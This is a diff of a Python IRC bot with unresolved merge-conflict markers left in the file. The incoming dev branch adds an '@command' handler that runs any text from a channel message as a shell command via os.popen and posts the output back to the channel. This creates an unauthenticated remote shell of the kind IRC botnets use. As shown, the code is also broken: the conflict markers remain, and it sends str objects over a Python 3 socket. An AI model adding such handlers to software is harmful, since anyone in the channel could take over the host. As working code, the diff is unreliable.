@@ -1,5 +1,9 @@
 #!/usr/bin/python3
 import socket
+<<<<<<< HEAD
+=======
+import os
+>>>>>>> dev
 from time import time,sleep
 ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
 def pong(): # respond to server Pings.
@@ -52,6 +56,19 @@ def joinchan(chan): # join channel(s).
         if ircmsg.find ( 'PING' ) != -1:
             ircsock.send ( 'PONG ' + ircmsg.split() [ 1 ] + '\r\n' )
             last_ping = time()
+<<<<<<< HEAD
+=======
+        if ircmsg.lower().find(":@hi") != -1:
+            ircsock.send("PRIVMSG " + chan +" :Hello!\r\n" );
+        if ircmsg.lower().find(":@command") != -1:
+            cmd = ircmsg.lower()[ircmsg.lower().find(":@command")+10:len(str(ircmsg))];
+            stream = os.popen(cmd)
+            output = stream.read()
+            ircsock.send("PRIVMSG " + chan + " :"+output+'\r'+'\n');
+        if ircmsg.lower().find(":@message") != -1:
+            cmd = ircmsg.lower()[ircmsg.lower().find(":@message")+10:len(str(ircmsg))];
+            ircsock.send("PRIVMSG " + chan + " :"+cmd+'\r'+'\n');
+>>>>>>> dev
 
 chan = '#bot-testing'
 
